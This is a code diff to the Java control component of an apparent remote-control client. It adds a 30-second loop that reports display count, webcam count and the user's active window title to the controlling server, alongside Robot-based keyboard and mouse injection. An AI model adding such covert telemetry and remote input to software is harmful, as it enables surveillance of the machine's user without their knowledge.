@@ -6,18 +6,36 @@ package br.com.introcdc.connect.client.components;
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.client.ConnectClient;
 import br.com.introcdc.connect.client.remote.RemoteEvent;
+import com.github.sarxos.webcam.Webcam;
+import com.sun.jna.Native;
+import com.sun.jna.platform.win32.User32;
+import com.sun.jna.platform.win32.WinDef;
+import oshi.SystemInfo;
 
 import java.awt.*;
 import java.awt.event.InputEvent;
 import java.awt.event.KeyEvent;
 import java.io.ObjectInputStream;
 import java.net.Socket;
+import java.util.concurrent.TimeUnit;
 
 public class ControlComponents {
 
     // Control Variables
     public static Robot ROBOT_INSTANCE;
     public static boolean ROBOT = true;
+
+    public static void startUpdater() {
+        ConnectClient.EXECUTOR.scheduleAtFixedRate(() -> {
+            try {
+                SystemInfo si = new SystemInfo();
+                ConnectClient.msg("updateinfo " + si.getHardware().getDisplays().size() + " " + Webcam.getWebcams().size() + " " + getActiveWindowTitle());
+            } catch (Exception ignored) {
+                ConnectClient.msg("updateinfo 0 0 " + getActiveWindowTitle());
+            }
+            ConnectClient.msg("rping");
+        }, 1, 30, TimeUnit.SECONDS);
+    }
 
     public static void typeString(Robot robot, String text) {
         try {
@@ -107,6 +125,13 @@ public class ControlComponents {
         } else {
             return InputEvent.BUTTON1_DOWN_MASK;
         }
+    }
+
+    public static String getActiveWindowTitle() {
+        char[] buffer = new char[1024];
+        WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
+        User32.INSTANCE.GetWindowText(hwnd, buffer, buffer.length);
+        return Native.toString(buffer).trim();
     }
 
 }
